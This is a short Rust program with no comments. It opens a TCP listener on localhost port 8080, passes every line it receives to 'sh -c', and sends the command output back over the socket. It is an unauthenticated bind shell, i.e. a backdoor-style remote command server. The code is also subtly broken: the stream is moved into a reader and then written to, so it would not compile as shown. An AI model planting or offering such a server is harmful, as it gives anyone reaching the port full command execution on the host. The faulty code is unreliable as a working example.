use std::io::{self, prelude::*, BufReader};
use std::net::{TcpListener, TcpStream};
use std::process::{Command, Stdio};

fn main() -> io::Result<()> {
    let listener = TcpListener::bind("127.0.0.1:8080")?;

    loop {
        let (stream, _) = listener.accept()?;
        std::thread::spawn(move || {
            let mut reader = BufReader::new(stream);
            let mut command = String::new();
            loop {
                reader.read_line(&mut command).unwrap();
                let output = Command::new("sh")
                    .arg("-c")
                    .arg(&command)
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .output()
                    .expect("Failed to execute command");
                let response = String::from_utf8_lossy(&output.stdout);
                stream.write_all(response.as_bytes()).unwrap();
                command.clear();
            }
        });
    }
}
